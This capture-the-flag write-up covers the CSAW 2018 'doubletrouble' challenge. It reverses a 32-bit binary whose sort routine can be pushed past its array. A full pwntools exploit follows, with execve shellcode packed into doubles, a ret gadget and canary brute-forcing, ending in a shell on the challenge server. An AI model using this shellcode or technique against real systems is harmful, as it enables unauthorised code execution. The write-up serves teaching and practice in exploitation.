# Csaw 2018 doubletrouble Pwn 200 (The Floating)

This writeup is dedicated to Pennywise the Dancing Clown. We all float down here:
https://www.youtube.com/watch?v=wHbpWtMOJTI

Let's take a look at the binary:

```
$ ./doubletrouble 
0xff930988
How long: 5
Give me: 15935728
Give me: 75395128
Give me: 95135728
Give me: 35715928
Give me: 82753951
0:1.593573e+07
1:7.539513e+07
2:9.513573e+07
3:3.571593e+07
4:8.275395e+07
Sum: 304936463.000000
Max: 95135728.000000
Min: 15935728.000000
My favorite number you entered is: 15935728.000000
Sorted Array:
0:1.593573e+07
1:3.571593e+07
2:7.539513e+07
3:8.275395e+07
4:9.513573e+07
$  pwn checksec doubletrouble 
[*] '/Hackery/csaw18/pwn/doubletrouble/doubletrouble'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
$  file doubletrouble 
doubletrouble: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b9a11827e910481da3ed76a1425d4c110fd0db97, not stripped
```

So we can see a couple of things. It appears to prompt us for a number of inputs, then it takes in those inputs and converts them to doubles. Proceeding that it does some arithmetic on those doubles, then sorts the doubles least to greatest. We can also see that we get what looks like to be a stack infoleak, but we confirm that it is a stack infoleak with gdb:

```
gdb-peda$ r
Starting program: /Hackery/csaw18/pwn/doubletrouble/doubletrouble 
0xffffcd68
How long: ^C

.  .  .

gdb-peda$ vmmap
Start      End        Perm Name
0x08048000 0x0804b000 r-xp /Hackery/csaw18/pwn/doubletrouble/doubletrouble
0x0804b000 0x0804c000 r-xp /Hackery/csaw18/pwn/doubletrouble/doubletrouble
0x0804c000 0x0804d000 rwxp /Hackery/csaw18/pwn/doubletrouble/doubletrouble
0x0804d000 0x0806f000 rwxp [heap]
0xf7dd5000 0xf7faa000 r-xp /lib/i386-linux-gnu/libc-2.27.so
0xf7faa000 0xf7fab000 ---p /lib/i386-linux-gnu/libc-2.27.so
0xf7fab000 0xf7fad000 r-xp /lib/i386-linux-gnu/libc-2.27.so
0xf7fad000 0xf7fae000 rwxp /lib/i386-linux-gnu/libc-2.27.so
0xf7fae000 0xf7fb1000 rwxp mapped
0xf7fcf000 0xf7fd1000 rwxp mapped
0xf7fd1000 0xf7fd4000 r--p [vvar]
0xf7fd4000 0xf7fd6000 r-xp [vdso]
0xf7fd6000 0xf7ffc000 r-xp /lib/i386-linux-gnu/ld-2.27.so
0xf7ffc000 0xf7ffd000 r-xp /lib/i386-linux-gnu/ld-2.27.so
0xf7ffd000 0xf7ffe000 rwxp /lib/i386-linux-gnu/ld-2.27.so
0xfffdd000 0xffffe000 rwxp [stack]
```

here we can see that the infoleak is from the stack (which starts at `0xfffdd000` and ends at `0xffffe000`). Also some other important things we can see about the binary, it has a stack canary and `RWX` segments (regions of memory that we can read, write, and execute). We can also see that it is a `32` bit elf

## Reversing

So starting off we have the main function (which we use Ghidra to decompile):

```
/* WARNING: Type propagation algorithm not settling */

undefined4 main(void)

{
  int canary;
  
  canary = __x86.get_pc_thunk.ax(&stack0x00000004);
  setvbuf((FILE *)(*(FILE **)(canary + 0x27da))->_flags,(char *)0x0,2,0);
  game();
  return 0;
}
```

From our perspective, the only thing we need to worry about here is that it calls `game()` which we can see here:

```
int game()
{
  int index; // esi@5
  long double sum; // fst7@7
  long double max; // fst7@7
  long double min; // fst7@7
  int favorite; // eax@7
  int result; // eax@7
  int v6; // ecx@7
  int heapQt; // [sp+Ch] [bp-21Ch]@1
  int i; // [sp+10h] [bp-218h]@4
  char *s; // [sp+14h] [bp-214h]@5
  double ptrArray[64]; // [sp+18h] [bp-210h]@1
  int canary; // [sp+21Ch] [bp-Ch]@1

  canary = *MK_FP(__GS__, 20);
  printf("%p\n", ptrArray);
  printf("How long: ");
  __isoc99_scanf("%d", &heapQt);
  getchar();
  if ( heapQt > 64 )
  {
    printf("Flag: hahahano. But system is at %d", &system);
    exit(1);
  }
  i = 0;
  while ( i < heapQt )
  {
    s = (char *)malloc(0x64u);
    printf("Give me: ");
    fgets(s, 100, stdin);
    index = i++;
    ptrArray[index] = atof(s);
  }
  printArray(&heapQt, (int)ptrArray);
  sum = sumArray(&heapQt, ptrArray);
  printf("Sum: %f\n", (double)sum);
  max = maxArray(&heapQt, ptrArray);
  printf("Max: %f\n", (double)max);
  min = minArray(&heapQt, ptrArray);
  printf("Min: %f\n", (double)min);
  favorite = findArray(&heapQt, (int)ptrArray, -100.0, -10.0);
  printf("My favorite number you entered is: %f\n", ptrArray[favorite]);
  sortArray(&heapQt, (int)ptrArray);
  puts("Sorted Array:");
  result = printArray(&heapQt, (int)ptrArray);
  if ( *MK_FP(__GS__, 20) != canary )
    _stack_chk_fail_local(v6, *MK_FP(__GS__, 20) ^ canary);
  return result;
}
```

So we can see how this game goes down. It first starts by printing the address of `ptrArray` for the infoleak, which we later see is where our input is stored as a double. scanning in an integer into `heapQt`. Proceeding that it checks to make sure it isn't greater than `64` (this is because `ptrArray` is only big enough to hold `64` doubles). If it is, the program exits and prints the address of system to taunt us for being bad. Proceeding that it enters into a for loop which runs `heapQt` times, which each time it scans in `100` bytes of data into the heap, then converts it into a double, and stores it in the array `ptrArray`.  Proceeding that, it runs a number of sub functions with `heapQt` and `ptrArray` as arguments.

Looking at the `sumArray`, `maxArray`, and `minArray` functions, they do pretty much what we would expect them to do. However when we get to `findArray`, that's when we see something intersting:

```
int __cdecl findArray(int *heapQt, int ptrArray, double a3, double a4)
{
  int v5; // [sp+1Ch] [bp-4h]@1

  _x86_get_pc_thunk_ax();
  v5 = *heapQt;
  while ( *heapQt < 2 * v5 )
  {
    if ( *(double *)(8 * (*heapQt - v5) + ptrArray) > (long double)a3
      && a4 > (long double)*(double *)(8 * (*heapQt - v5) + ptrArray) )
    {
      return *heapQt - v5;
    }
    *heapQt += (int)&GLOBAL_OFFSET_TABLE_ + 0xF7FB4001;
  }
  *heapQt = v5;
  return 0;
}
```

Particularyly this line is interesting:

```
  *heapQt = v5;
```

This dereferences a ptr to `heapQt` and writes a value to it. This is interesting to us, since it will allow us to change the value of `heapQt`, which is then passed as an argument to `sortArray`. Looking at the condition (since `a3` is `-10` and `a4` is `-100`), it appears that a value between `-10` and `-100` will trigger the write (I used `-23`). The write appears to increase the value of `heapQt`. Next up we have the `sortArray` function:

```
signed int __cdecl sortArray(_DWORD *heapQt, int ptrArray)
{
  double v2; // ST08_8@4
  int i; // [sp+0h] [bp-10h]@1
  int j; // [sp+4h] [bp-Ch]@2

  _x86_get_pc_thunk_ax();
  for ( i = 0; i < *heapQt; ++i )
  {
    for ( j = 0; j < *heapQt - 1; ++j )
    {
      if ( *(double *)(8 * j + ptrArray) > (long double)*(double *)(8 * (j + 1) + ptrArray) )
      {
        v2 = *(double *)(8 * j + ptrArray);
        *(double *)(8 * j + ptrArray) = *(double *)(ptrArray + 8 * (j + 1));
        *(double *)(8 * (j + 1) + ptrArray) = v2;
      }
    }
  }
  return 1;
}
```

So looking at this function, we can see that it essentially will loop through the first `heapQt` doubles of `ptrArray`. It will compare the value of that double, with the value of the double after it. If the double after it is less than the double before it, it will swap the two. So essentially it just organizes `heapQt` doubles, starting at the start of `ptrArray` from smallest to biggest double.

## Exploitation

So we have a bug, where we can overwrite the number of doubles which is sorted in `sortArray`. We also have a stack infoleak, an executable stack, and the abillity to write data to the stack. And looking at the stack layout in IDA, we see that `16` bytes after our double array is the return address:

```
-00000210 ptrArray        dq 64 dup(?)
-00000010                 db ? ; undefined
-0000000F                 db ? ; undefined
-0000000E                 db ? ; undefined
-0000000D                 db ? ; undefined
-0000000C canary          dd ?
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004                 db ? ; undefined
-00000003                 db ? ; undefined
-00000002                 db ? ; undefined
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
```

Essentially what we will do is, we will write a greater value to `heapQt` than `64`, that way it will start sorting data past `ptrArray`. Specifically, we will get it to place an address that we want where the return address is stored at `ebp+0x4`, which will give us code execution. We will also need to make sure the sorting algorithm leaves the stack canary in the same place, otherwise the binary will crash before we get code execution.

```
gdb-peda$ x/152x 0xff8969b8
0xff8969b8: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff8969c8: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff8969d8: 0x00000000  0xff820d84  0x00000000  0xc0370000
0xff8969e8: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff8969f8: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896a08: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896a18: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896a28: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896a38: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896a48: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896a58: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896a68: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896a78: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896a88: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896a98: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896aa8: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896ab8: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896ac8: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896ad8: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896ae8: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896af8: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896b08: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896b18: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896b28: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896b38: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896b48: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896b58: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896b68: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896b78: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896b88: 0x00000000  0xff820d84  0x00000000  0xff820d84
0xff896b98: 0x00000000  0xff820d84  0x00000000  0x00000000
0xff896ba8: 0x00000000  0x00000000  0x00000000  0x0804900a
0xff896bb8: 0xff896bd8  0x1d781100  0x0804c000  0xf7f41000
0xff896bc8: 0xff896bd8  0x08049841  0xff896bf0  0x00000000
0xff896bd8: 0x00000000  0xf7d81e81  0xf7f41000  0xf7f41000
0xff896be8: 0x00000000  0xf7d81e81  0x00000001  0xff896c84
0xff896bf8: 0xff896c8c  0xff896c14  0x00000001  0x00000000
0xff896c08: 0xf7f41000  0xf7f7975a  0xf7f91000  0x00000000
gdb-peda$ i f
Stack level 0, frame at 0xff896bd0:
 eip = 0x8049733 in game; saved eip = 0x8049841
 called by frame at 0xff896bf0
 Arglist at 0xff896bc8, args: 
 Locals at 0xff896bc8, Previous frame's sp is 0xff896bd0
 Saved registers:
  ebx at 0xff896bc0, ebp at 0xff896bc8, esi at 0xff896bc4, eip at 0xff896bcc
gdb-peda$ x/x $ebp-0xc
0xff896bbc: 0x1d781100
```

So we can see here, an example memory layout of the stack prior to the sorting. We can see that the return adress is at `0xff896bcc` (which is `0x8049841`) and the stack canary is at `0xff896bbc` (which is `0x1d781100`). In this instance, my input ends at `0xff896bb4` with `0x0804900a00000000`. Keep in mind, that when evaluating the doubles (which are `8` bytes in memory) the last `4` bytes are stored first, which are followed by the first `4` bytes. For instance. 
 
```
 gdb-peda$ p/f 0x0804900a00000000
 $1 = 4.8653382194983783e-270
gdb-peda$ p/f 0xff820d8400000000
$2 = -1.5846380065386629e+306
```

We can see that our input largely consists of the values `4.8653382194983783e-270`, which is followed by `-1.5846380065386629e+306`. 

We can see that values that start with `0xf` are really small when interpreted as a float. Thus they will float up the stack, while larger float values like `0x8049841` (which is the return address) would get moved to the bottom.

Now to get the return address overwritten, what we can do is we can make the value of `heapQt` that which it extense to two doubles past the return address, which will be the value `69` (hex `0x45`). To get it to this value, I didn't reverse the algroithm to figure out what value get's written. I just noticed that the number of inputs I send before/after `-23` (which triggers the write) influences it, so I just played with it untill I got it right.

Proceeding that, we will include three floats which their hex value begins with `0x804`. They will all be less than the value `0x8049841` when converted to a float. The reason for this being, that they should be greater than all values other than the return address (`0x8049841`) which is the same everyt time, so it will occupy the value before, after, and the same as the return address. Now because the value we have in the return address has to start with `0x804` and be less than `0x8049841`, this limits us to what we can call to certain sections of the code, such as certain ROP gadgets. However we find one that meets our needs:

```
ROPgadget --binary doubletrouble | grep 804900a
0x0804900a : ret
```

This particular rop gadget fits our needs for two reasons. The first is that when converted to a float, it is less than `0x8049841` so it will be before it after the sorting. The second reason is that all it does is just returns. This is beneftitial to us, since all it will do is just continue to the next address and execute it, which will be the last `4` bytes of the next double. We can place the stack address of our shellcode (we know it from the stack infoleak, and the stack is executable). With the first four bytes of the double, we can put a value between `0x804900a` and `0x8049841`. That way this double will always come between the actual return address, and `0x804900a`. This will allow us to execute our shellcode on the stack, which we can't simply just push it into the return address spot, since it starts with `0xff` and will just float to the top.

The value that we will have before the `0x804900a` double will be `0x800000000000000`. The reason for this, is it will occupy the spot between the stack canary and the `0x804900a` double. This way, after the sorting, the stack canary will remain in the same spot. Of course, this will only work if the stack canary's value is less tgab `0x8000000`, but bigger than the previous double. This gives us a range of about 8 different bytes which the stack canary could be which our exploit would work. The thing is since the stack canary is a random value (will the first three bytes for `x86` are, the fourth is always a null byte), and since the position of everything depends on it's value with respect to other floats, we will have to assume that the stack canary is within a certain value in order for our exploit to work. For testing purposes we can just set the stack canary to the value within the range. When we go ahead and run the exploit for real, we can just brute force the canary value we need by running the exploit again and again untill we get a stack canary value within the range we need.

The last thing we need to worry about is our shellcode, since we will need to know where it is on the stack to execute it, and we also need to make sure it stays intact and in the correct order after it is sorted. The way I accomplished this is by appending the `0x90` byte a certain amount of times tot he front of ceratin parts of shellcode. This is because when executed `0x90` is the opcode for `NOP` which continues execution and doesn't effect our shellcode in any important way, and it will be evaluated as less than values starting with `0x804` so it won't affect the stack canary or what we did to write over the return address.

However when we insert the NOPs into our shellcode, we will have to rewite/recompile the shellcode. The reason for this, is because if we just insert NOPs into random places, there is a good chance we will insert a NOP in the middle of an instruction, which will change what the instruction does. Also note, the base shellcode I did not write. I grabbed it from `http://shell-storm.org/shellcode/files/shellcode-599.php` and modified it. Also I found that this website which is an online x86/x64 decompiler/compiler helped `https://defuse.ca/online-x86-assembler.htm`:

here is the shellcode before we modified it:
```
0:  6a 17                   push   0x17
2:  58                      pop    eax
3:  31 db                   xor    ebx,ebx
5:  cd 80                   int    0x80
7:  50                      push   eax
8:  68 2f 2f 73 68          push   0x68732f2f
d:  68 2f 62 69 6e          push   0x6e69622f
12: 89 e3                   mov    ebx,esp
14: 99                      cdq
15: 31 c9                   xor    ecx,ecx
17: b0 0b                   mov    al,0xb
19: cd 80                   int    0x80 
```

This shellcode is `27` bytes. After we figure out how to split the individual commands up with `\x90`s in a way that the instructions will still execute properly, and after the sorting the shellcode will be in the proper order, we get the following segments:

```
0x9101eb51e1f7c931:

0x90909068732f2f68:

0x9090406e69622f68:

0x900080cd0bb0e389:
```

keep in mind, because of how the data is stored, the last four bytes will be executed first. After a lot of trial and error, we see that this is our shellcode:

```
gdb-peda$ x/16i 0xffff7ca0
   0xffff7ca0: xor    ecx,ecx
   0xffff7ca2: mul    ecx
   0xffff7ca4: push   ecx
   0xffff7ca5: jmp    0xffff7ca8
   0xffff7ca7: xchg   ecx,eax
   0xffff7ca8: push   0x68732f2f
   0xffff7cad: nop
   0xffff7cae: nop
   0xffff7caf: nop
   0xffff7cb0: push   0x6e69622f
   0xffff7cb5: inc    eax
   0xffff7cb6: nop
   0xffff7cb7: nop
   0xffff7cb8: mov    ebx,esp
   0xffff7cba: mov    al,0xb
   0xffff7cbc: int    0x80
```

Also to find the offset from the infoleak to where our shellcode is, we can just run the exploit once with our shellcode, and see where our shellcode ends up in respect to the stack infoleak. When I did this, I found that the offset was `+0x1d8` bytes from the infoleak.

## tl ; dr

A quick overview of this challenge
```
*  Program scans in up to 64 doubles, and sorts them from smallest to largest
*  Bug in `findArray` allows us to overwrite the float count with a larger value, thus when it sorts the doubles, it will sort values past our input, allowing us to move the return address.
*  Format payload to call rop gadget, then shellcode on the stack using stack infoleak. The canary has to be within a set range. 
*  Format the shellcode to be together after the sorting
*  Brute force the stack canary untill it is within a range that wouldn't crash our exploit
```
## Exploit

putting it all together, we get the following exploit:
```
# Import the libraries
from pwn import *
import struct

# Establish the target
#target = process('./doubletrouble')
#gdb.attach(target, gdbscript='b *0x8049733')
target = remote('pwn.chal.csaw.io', 9002)

# Get the infoleak, calculate the offset to our shellcode
stack = target.recvline()
stack = stack.replace("\x0a", "")
stack = int(stack, 16)
scadr = stack + 0x1d8

# Create the integer we will create, that will be stored as the double after the ROPgadget 0x804900a, which is the first return address we put
ret = "0x8049010" + hex(scadr).replace("0x", "")
ret = int(ret, 16)

# Scan in some of the input 
target.recvuntil("How long: ")


# Etsablish the four blocks as floats, which make up our shellcode
s1 = "-9.455235083177544e-227"# 0x9101eb51e1f7c931
s2 = "-6.8282747051424842e-229"# 0x90909068732f2f68 
s3 = "-6.6994892300412978e-229"# 0x9090406e69622f68
s4 = "-1.3287388429188698e-231"# 0x900080cd0bb0e389
# shellcode does the following:
'''
   0xffff7ca0: xor    ecx,ecx
   0xffff7ca2: mul    ecx
   0xffff7ca4: push   ecx
   0xffff7ca5: jmp    0xffff7ca8
   0xffff7ca7: xchg   ecx,eax
   0xffff7ca8: push   0x68732f2f
   0xffff7cad: nop
   0xffff7cae: nop
   0xffff7caf: nop
   0xffff7cb0: push   0x6e69622f
   0xffff7cb5: inc    eax
   0xffff7cb6: nop
   0xffff7cb7: nop
   0xffff7cb8: mov    ebx,esp
   0xffff7cba: mov    al,0xb
   0xffff7cbc: int    0x80
'''

# Send the amount of floats we will input, and then send the first 5
target.sendline('64')
for i in range(5):

   target.sendline('-1.5846380065386629e+306')#0xff820d8400000000

# Send the value which will trigger the bug to write over heapQt
target.sendline('-23')

# Send the rest of the filler floats
for i in range(51):
   target.sendline('-1.5846380065386629e+306')#0xff820d8400000000

# This is the value which will be between the stack canary, and the double which occupies the return address
target.sendline('3.7857669957336791e-270')#0x0800000000000000

# Send the shellcode blocks
target.sendline(s1)
target.sendline(s2)
target.sendline(s3)
target.sendline(s4)

# Send the double which will reside after the return address double, which will store the address of our shellcode in the last four bytes. 
# We have to convert the int to a float, so it's stored in memory correctly
target.sendline("%.19g" % struct.unpack("<d", p64(ret)))

# Send the double which will occupy the return address with the gadget 0x804900a: ret
target.sendline('4.8653382194983783e-270')#0x804900a00000000

# Drop to an interactive shell
target.interactive()
```

we have to run the exploit several times before it works (due to the fact that we need the first byte of the canary to be in a certain range). But once it is, we get this:

```
$  python exploit.py 
[+] Opening connection to pwn.chal.csaw.io on port 9002: Done
[*] Switching to interactive mode
64
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-23
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.58463800653Give me: 86629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
-1.5846380065386629e+306
3.7857669957336791e-270
-9.455235083177544e-Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: Give me: 227
-6.8282747051424842e-229
-6.6994892300412978e-229
-1.3287388429188698e-231
4.865363487548704948e-270
4.8653382194983783e-270
Give me: Give me: Give me: Give me: Give me: 0:-1.584638e+306
1:-1.584638e+306
2:-1.584638e+306
3:-1.584638e+306
4:-1.584638e+306
5:-2.300000e+01
6:-1.584638e+306
7:-1.584638e+306
8:-1.584638e+306
9:-1.584638e+306
10:-1.584638e+306
11:-1.584638e+306
12:-1.584638e+306
13:-1.584638e+306
14:-1.584638e+306
15:-1.584638e+306
16:-1.584638e+306
17:-1.584638e+306
18:-1.584638e+306
19:-1.584638e+306
20:-1.584638e+306
21:-1.584638e+306
22:-1.584638e+306
23:-1.584638e+306
24:-1.584638e+306
25:-1.584638e+306
26:-1.584638e+306
27:-1.584638e+306
28:-1.584638e+306
29:-1.584638e+306
30:-1.584638e+306
31:-1.584638e+306
32:-1.584638e+306
33:-1.584638e+306
34:-1.584638e+306
35:-1.584638e+306
36:-1.584638e+306
37:-1.584638e+306
38:-1.584638e+306
39:-1.584638e+306
40:-1.584638e+306
41:-1.584638e+306
42:-1.584638e+306
43:-1.584638e+306
44:-1.584638e+306
45:-1.584638e+306
46:-1.584638e+306
47:-1.584638e+306
48:-1.584638e+306
49:-1.584638e+306
50:-1.584638e+306
51:-1.584638e+306
52:-1.584638e+306
53:-1.584638e+306
54:-1.584638e+306
55:-1.584638e+306
56:-1.584638e+306
57:3.785767e-270
58:-9.455235e-227
59:-6.828275e-229
60:-6.699489e-229
61:-1.328739e-231
62:4.865363e-270
63:4.865338e-270
Sum: -88739728366165125028685448406029643546277776677711731866489244413884850397602464820747806329471620672233559480029832790383745915926540359844557891236725370073933930276557223908896897136922922578474598315771085562474129643582927347625724598568687392255127493856259386716274770720868111931435349064767563104256.000000
Max: 0.000000
Min: -1584638006538662946940811578679100777612103154959138069044450793105086614242901157513353684454850369147027847857675585542566891355831077854367105200655810179891677326367093284087444591730766474615617827067340813615609457921123702636173653545869417718841562390290346191362049477158359141632774090442277912576.000000
My favorite number you entered is: -23.000000
Sorted Array:
0:-1.584638e+306
1:-1.584638e+306
2:-1.584638e+306
3:-1.584638e+306
4:-1.584638e+306
5:-1.584638e+306
6:-1.584638e+306
7:-1.584638e+306
8:-1.584638e+306
9:-1.584638e+306
10:-1.584638e+306
11:-1.584638e+306
12:-1.584638e+306
13:-1.584638e+306
14:-1.584638e+306
15:-1.584638e+306
16:-1.584638e+306
17:-1.584638e+306
18:-1.584638e+306
19:-1.584638e+306
20:-1.584638e+306
21:-1.584638e+306
22:-1.584638e+306
23:-1.584638e+306
24:-1.584638e+306
25:-1.584638e+306
26:-1.584638e+306
27:-1.584638e+306
28:-1.584638e+306
29:-1.584638e+306
30:-1.584638e+306
31:-1.584638e+306
32:-1.584638e+306
33:-1.584638e+306
34:-1.584638e+306
35:-1.584638e+306
36:-1.584638e+306
37:-1.584638e+306
38:-1.584638e+306
39:-1.584638e+306
40:-1.584638e+306
41:-1.584638e+306
42:-1.584638e+306
43:-1.584638e+306
44:-1.584638e+306
45:-1.584638e+306
46:-1.584638e+306
47:-1.584638e+306
48:-1.584638e+306
49:-1.584638e+306
50:-1.584638e+306
51:-1.584638e+306
52:-1.584638e+306
53:-1.584638e+306
54:-1.584638e+306
55:-1.584638e+306
56:-8.130783e+269
57:-2.367557e+269
58:-2.300000e+01
59:-9.455235e-227
60:-6.828275e-229
61:-6.699489e-229
62:-1.328739e-231
63:2.119251e-314
64:3.931085e-303
65:3.785767e-270
66:4.865338e-270
67:4.865363e-270
68:4.872934e-270
sh: 0: can't access tty; job control turned off
$ $ ls
ls
doubletrouble  flag.txt
$ $ w
w
 03:58:44 up 3 days,  3:25,  0 users,  load average: 7.25, 7.27, 7.15
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
$ $ cat flag.txt
cat flag.txt
flag{4_d0ub1e_d0ub1e_3ntr3ndr3}
```

Just like that, we got the flag!